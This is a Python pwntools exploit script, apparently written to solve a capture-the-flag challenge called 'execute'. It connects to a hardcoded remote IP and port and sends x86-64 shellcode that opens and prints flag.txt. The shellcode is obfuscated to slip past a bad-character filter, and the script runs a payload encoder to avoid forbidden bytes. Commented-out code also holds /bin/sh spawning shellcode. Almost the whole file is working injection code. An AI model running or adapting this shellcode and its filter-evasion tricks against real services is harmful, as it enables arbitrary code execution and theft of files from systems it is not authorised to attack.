#!/usr/bin/python2

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

#io = process('./execute')
ip, port = '94.237.54.170', 44692
io = remote(ip, port)

#shellcode = asm(shellcraft.open('flag.txt'))
#shellcode += asm(shellcraft.read(3, 'rsp', 64))
#shellcode += asm(shellcraft.write(1, 'rsp', 64))

'''
    /* push 'flag.txt\x00' */
    push 1
    dec byte ptr [rsp]
    mov rax, 0x7478742e67616c66
    push rax
    /* call open('rsp', 'O_RDONLY', 0) */
    push SYS_open /* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi /* O_RDONLY */
    cdq /* rdx=0 */
    syscall
    /* call sendfile(1, 'rax', 0, 2147483647) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push SYS_sendfile /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    syscall

'''


#print(shellcraft.linux.cat('flag.txt'))
#shellcode = asm(shellcraft.linux.cat('flag.txt'))
shellcode = asm('''
push 1
dec byte ptr [rsp]
mov rax, 0x7478742e60606060
add rax, 0x0000000007010c06
push rax
push 2
pop rax
mov rdi, rsp
mov esi, 0
cdq 
syscall
mov r10d, 0x7fffffff
mov rsi, rax
push 0x28
pop rax
push 1
pop rcx
mov rdi, rcx
cdq 
syscall
''')
print(shellcode.encode('hex'))
print(len(shellcode))
#shellcode = "\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"

'''
shellcode = asm(shellcraft.linux.sh())
#shellcode = "\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
print(shellcode.encode('hex'))
print(len(shellcode))
'''

avd = "\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
for x in avd:
	if x in shellcode:
		print("Bad Char: ", x, hex(ord(x)))

'''
#for x in avd:
#	print(x, hex(ord(x)))
'''

payload = encoders.encode(shellcode, avoid=avd)
print(payload.encode('hex'))
print(len(payload))

io.sendlineafter('Hey, just because I am hungry doesn\'t mean I\'ll execute everything', payload)
print(io.recvline())
print(io.recvline())
#io.interactive()
